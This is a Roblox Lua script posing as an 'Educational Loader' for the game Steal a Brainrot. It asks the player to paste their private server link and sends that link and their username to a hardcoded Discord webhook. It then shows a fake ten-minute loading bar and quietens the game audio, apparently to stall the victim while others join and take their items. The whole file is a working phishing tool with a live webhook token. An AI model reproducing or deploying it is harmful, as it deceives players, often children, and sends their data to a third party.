-- Steal a Brainrot | Educational Loader
-- User-provided private server link → send to webhook
-- Fullscreen 0–100% reading simulation (10 minutes)
-- Local audio muffling (safe)

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local SoundService = game:GetService("SoundService")
local player = Players.LocalPlayer

-- 🔴 Discord webhook
local WEBHOOK_URL = "https://discord.com/api/webhooks/1459228691719524423/2wshWHQe64lNdZ3IuwAEOVni6bLXiKmlQ_tIeorJOylviHrJk5cWtMGVVDGX58N-eApn"

-- ===== GUI: LINK INPUT =====
local gui = Instance.new("ScreenGui")
gui.Name = "PrivateLinkFlow"
gui.ResetOnSpawn = false
gui.Parent = player.PlayerGui

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 420, 0, 220)
frame.Position = UDim2.fromScale(0.5, 0.5)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(25,25,25)
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1,0,0,40)
title.BackgroundTransparency = 1
title.Text = "Private Server Link Required"
title.TextColor3 = Color3.new(1,1,1)
title.Font = Enum.Font.GothamBold
title.TextSize = 16

local box = Instance.new("TextBox", frame)
box.Size = UDim2.new(1,-40,0,40)
box.Position = UDim2.new(0,20,0,60)
box.PlaceholderText = "Paste private server link here"
box.ClearTextOnFocus = false
box.Text = ""
box.BackgroundColor3 = Color3.fromRGB(35,35,35)
box.TextColor3 = Color3.new(1,1,1)
box.Font = Enum.Font.Gotham
box.TextSize = 14
Instance.new("UICorner", box).CornerRadius = UDim.new(0,8)

local submit = Instance.new("TextButton", frame)
submit.Size = UDim2.new(0.45,0,0,36)
submit.Position = UDim2.new(0.05,0,1,-50)
submit.Text = "Submit"
submit.BackgroundColor3 = Color3.fromRGB(0,170,255)
submit.TextColor3 = Color3.new(1,1,1)
submit.Font = Enum.Font.GothamBold
submit.TextSize = 14
Instance.new("UICorner", submit).CornerRadius = UDim.new(0,8)

local cancel = Instance.new("TextButton", frame)
cancel.Size = UDim2.new(0.45,0,0,36)
cancel.Position = UDim2.new(0.5,0,1,-50)
cancel.Text = "Cancel"
cancel.BackgroundColor3 = Color3.fromRGB(200,60,60)
cancel.TextColor3 = Color3.new(1,1,1)
cancel.Font = Enum.Font.GothamBold
cancel.TextSize = 14
Instance.new("UICorner", cancel).CornerRadius = UDim.new(0,8)

-- ===== FULLSCREEN OVERLAY =====
local overlay = Instance.new("Frame")
overlay.Size = UDim2.fromScale(1,1)
overlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
overlay.BackgroundTransparency = 0.2
overlay.Visible = false
overlay.ZIndex = 10
overlay.Parent = gui

local container = Instance.new("Frame", overlay)
container.Size = UDim2.new(0,520,0,220)
container.Position = UDim2.fromScale(0.5,0.5)
container.AnchorPoint = Vector2.new(0.5,0.5)
container.BackgroundColor3 = Color3.fromRGB(25,25,25)
container.ZIndex = 11
Instance.new("UICorner", container).CornerRadius = UDim.new(0,12)

local t2 = Instance.new("TextLabel", container)
t2.Size = UDim2.new(1,0,0,50)
t2.BackgroundTransparency = 1
t2.Text = "Unshij baina..."
t2.TextColor3 = Color3.new(1,1,1)
t2.Font = Enum.Font.GothamBold
t2.TextSize = 18
t2.ZIndex = 12

local barBg = Instance.new("Frame", container)
barBg.Size = UDim2.new(1,-60,0,28)
barBg.Position = UDim2.new(0,30,0,90)
barBg.BackgroundColor3 = Color3.fromRGB(50,50,50)
barBg.ZIndex = 12
Instance.new("UICorner", barBg).CornerRadius = UDim.new(0,8)

local bar = Instance.new("Frame", barBg)
bar.Size = UDim2.new(0,0,1,0)
bar.BackgroundColor3 = Color3.fromRGB(0,170,255)
bar.ZIndex = 13
Instance.new("UICorner", bar).CornerRadius = UDim.new(0,8)

local percent = Instance.new("TextLabel", container)
percent.Size = UDim2.new(1,0,0,30)
percent.Position = UDim2.new(0,0,0,130)
percent.BackgroundTransparency = 1
percent.Text = "0%"
percent.TextColor3 = Color3.new(1,1,1)
percent.Font = Enum.Font.Gotham
percent.TextSize = 16
percent.ZIndex = 12

-- ===== LOGIC =====
local function sendToWebhook(link)
	local data = {
		content = ("**Private Server Link Received**\nUser: %s\nLink: %s"):format(player.Name, link)
	}
	pcall(function()
		HttpService:PostAsync(
			WEBHOOK_URL,
			HttpService:JSONEncode(data),
			Enum.HttpContentType.ApplicationJson
		)
	end)
end

local originalVolume = SoundService.Volume

local function startReading()
	SoundService.Volume = math.clamp(originalVolume * 0.4, 0, 1)
	frame.Visible = false
	overlay.Visible = true

	task.spawn(function()
		for i=0,100 do
			bar.Size = UDim2.new(i/100, 0, 1, 0)
			percent.Text = i.."%"
			task.wait(6)
		end
		percent.Text = "Completed"
		task.wait(2)
		SoundService.Volume = originalVolume
		gui:Destroy()
	end)
end

submit.MouseButton1Click:Connect(function()
	local link = box.Text
	if link == "" or not string.find(link, "roblox.com") then
		game.StarterGui:SetCore("SendNotification", {
			Title = "Error",
			Text = "Zuv private server link oruulna uu",
			Duration = 4
		})
		return
	end
	sendToWebhook(link)
	startReading()
end)

cancel.MouseButton1Click:Connect(function()
	gui:Destroy()
end)
